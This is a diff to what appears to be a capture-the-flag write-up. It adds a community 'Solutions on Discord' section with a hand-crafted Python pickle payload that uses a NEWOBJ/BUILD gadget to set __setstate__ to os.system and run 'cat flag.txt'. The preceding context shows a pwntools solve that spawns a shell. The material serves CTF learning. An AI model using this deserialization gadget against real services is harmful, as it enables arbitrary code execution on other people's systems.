@@ -78,3 +78,29 @@ p.recvuntil(b">>>")
 p.sendline(b"import os;os.system('sh')")
 p.interactive()
 ```
+
+Solutions on Discord:
+
+@bylal:
+
+```python
+import pickle
+
+# We use Exception because it's a built-in class that allows NEWOBJ
+# and has a __dict__ we can manipulate with BUILD.
+payload = b'\x80\x04'                # Protocol 4
+payload += b'cbuiltins\nException\n' # Push Exception class
+payload += b')'                      # EMPTY_TUPLE
+payload += b'\x81'                   # NEWOBJ: Create Exception instance
+payload += b'}'                      # EMPTY_DICT
+payload += b'('                      # MARK
+payload += b'S"__setstate__"\n'      # Key
+payload += b'cos\nsystem\n'          # Value: os.system
+payload += b'u'                      # SETITEMS: {'__setstate__': os.system}
+payload += b'b'                      # BUILD: sets instance.__setstate__ = os.system
+payload += b'Vcat flag.txt\n'        # The command string
+payload += b'b'                      # BUILD: calls instance.__setstate__("cat flag.txt")
+payload += b'.'                      # STOP
+
+print(payload.hex())
+```
